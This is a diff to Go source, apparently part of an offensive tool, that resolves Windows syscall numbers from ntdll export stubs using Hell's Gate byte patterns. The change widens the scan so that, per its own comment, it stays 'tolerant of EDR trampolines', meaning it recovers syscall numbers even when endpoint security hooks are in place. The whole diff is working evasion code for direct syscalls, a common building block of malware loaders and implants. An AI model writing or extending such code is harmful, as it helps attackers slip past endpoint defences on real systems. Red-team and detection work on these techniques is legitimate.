@@ -36,7 +36,7 @@ func GetModuleBase(moduleName string) (uintptr, error) {
 			return 0, fmt.Errorf("module %s not found", moduleName)
 		}
 
-	_unicodeStr := moduleEntry + uintptr(inMemoryOrderOffset) - 0x10
+		_unicodeStr := moduleEntry + uintptr(inMemoryOrderOffset) - 0x10
 		unicodeStr := (*UnicodeString)(unsafe.Pointer(_unicodeStr))
 
 		if unicodeStr.Length > 0 && unicodeStr.Buffer != nil {
@@ -75,7 +75,7 @@ func findGadget(base uintptr, size uintptr, fnHash uint32) (uintptr, error) {
 	}
 	ntHeadersOffset := *(*uint32)(unsafe.Pointer(dosHeader + 0x3C))
 	ntHeaders := dosHeader + uintptr(ntHeadersOffset)
-NumberOfRvaAndSizes := *(*uint32)(unsafe.Pointer(ntHeaders + 0x74))
+	NumberOfRvaAndSizes := *(*uint32)(unsafe.Pointer(ntHeaders + 0x74))
 	optionalHeader := ntHeaders + 0x18
 
 	exportDirRVA := *(*uint32)(unsafe.Pointer(optionalHeader + 0x70))
@@ -134,48 +134,52 @@ func findSyscallGadget(base uintptr, size uintptr) (uintptr, error) {
 	return 0, fmt.Errorf("syscall gadget not found")
 }
 
-func resolveSSN(base uintptr, fnHash uint32) (uint16, error) {
-	addr, err := findGadget(base, ntdllSize, fnHash)
+// scanSSN walks the exported stub in search of the SSN immediate. The window
+// is widened to 64 bytes and tolerant of EDR trampolines: a jmp-hook only
+// displaces the mov immediate, it does not remove it.
+func scanSSN(addr uintptr) (uint16, error) {
+	for i := uintptr(0); i < 64; i++ {
+		b0 := *(*byte)(unsafe.Pointer(addr + i))
+		if b0 == 0xB8 {
+			b5 := *(*byte)(unsafe.Pointer(addr + i + 5))
+			b6 := *(*byte)(unsafe.Pointer(addr + i + 6))
+			if b5 == 0x0F && b6 == 0x05 {
+				// B8 XX XX 00 00 0F 05 — MOV EAX, SSN; SYSCALL
+				return uint16(*(*byte)(unsafe.Pointer(addr + i + 1))) | uint16(*(*byte)(unsafe.Pointer(addr + i + 2)))<<8, nil
+			}
+			if b5 == 0xC3 {
+				// B8 XX XX 00 00 C3 — MOV EAX, SSN; RET
+				return uint16(*(*byte)(unsafe.Pointer(addr + i + 1))) | uint16(*(*byte)(unsafe.Pointer(addr + i + 2)))<<8, nil
+			}
+		}
+		if b0 == 0x4C && *(*byte)(unsafe.Pointer(addr + i + 1)) == 0x8B &&
+			*(*byte)(unsafe.Pointer(addr + i + 2)) == 0xD1 && *(*byte)(unsafe.Pointer(addr + i + 3)) == 0xB8 {
+			// 4C 8B D1 B8 XX XX 00 00 0F 05 — Hells Gate direct
+			return uint16(*(*byte)(unsafe.Pointer(addr + i + 4))) | uint16(*(*byte)(unsafe.Pointer(addr + i + 5)))<<8, nil
+		}
+	}
+
+	// Last resort: any MOV EAX, imm32 inside the stub.
+	for i := uintptr(0); i < 64; i++ {
+		b0 := *(*byte)(unsafe.Pointer(addr + i))
+		if b0 == 0xB8 {
+			return uint16(*(*byte)(unsafe.Pointer(addr + i + 1))) | uint16(*(*byte)(unsafe.Pointer(addr + i + 2)))<<8, nil
+		}
+	}
+
+	return 0, fmt.Errorf("could not determine SSN")
+}
+
+func resolveSSNIn(base uintptr, size uintptr, fnHash uint32) (uint16, error) {
+	addr, err := findGadget(base, size, fnHash)
 	if err != nil {
 		return 0, err
 	}
+	return scanSSN(addr)
+}
 
-	for i := uintptr(0); i < 32; i++ {
-		b0 := *(*byte)(unsafe.Pointer(addr + i))
-		b1 := *(*byte)(unsafe.Pointer(addr + i + 1))
-		b2 := *(*byte)(unsafe.Pointer(addr + i + 2))
-		b3 := *(*byte)(unsafe.Pointer(addr + i + 3))
-		b4 := *(*byte)(unsafe.Pointer(addr + i + 4))
-		b5 := *(*byte)(unsafe.Pointer(addr + i + 5))
-		b6 := *(*byte)(unsafe.Pointer(addr + i + 6))
-
-		if b0 == 0xB8 && b5 == 0x0F && b6 == 0x05 {
-			// B8 XX XX 00 00 0F 05 — MOV EAX, SSN; SYSCALL
-			ssn := uint16(b1) | uint16(b2)<<8
-			return ssn, nil
-		}
-		if b0 == 0xB8 && b5 == 0xC3 {
-			// B8 XX XX 00 00 C3 — MOV EAX, SSN; RET
-			ssn := uint16(b1) | uint16(b2)<<8
-			return ssn, nil
-		}
-		if b0 == 0x4C && b1 == 0x8B && b2 == 0xD1 && b3 == 0xB8 {
-			// 4C 8B D1 B8 XX XX 00 00 0F 05 — Hells Gate direct
-			ssn := uint16(b4) | uint16(b5)<<8
-			return ssn, nil
-		}
-	}
-
-	for i := uintptr(0); i < 32; i++ {
-		b0 := *(*byte)(unsafe.Pointer(addr + i))
-		if b0 == 0xB8 {
-			ssn := uint16(*(*byte)(unsafe.Pointer(addr + i + 1)))
-			ssn |= uint16(*(*byte)(unsafe.Pointer(addr + i + 2))) << 8
-			return ssn, nil
-		}
-	}
-
-	return 0, fmt.Errorf("could not determine SSN for hash 0x%x", fnHash)
+func resolveSSN(base uintptr, fnHash uint32) (uint16, error) {
+	return resolveSSNIn(base, ntdllSize, fnHash)
 }
 
 func ResolveFromDisk(dllPath string) error {
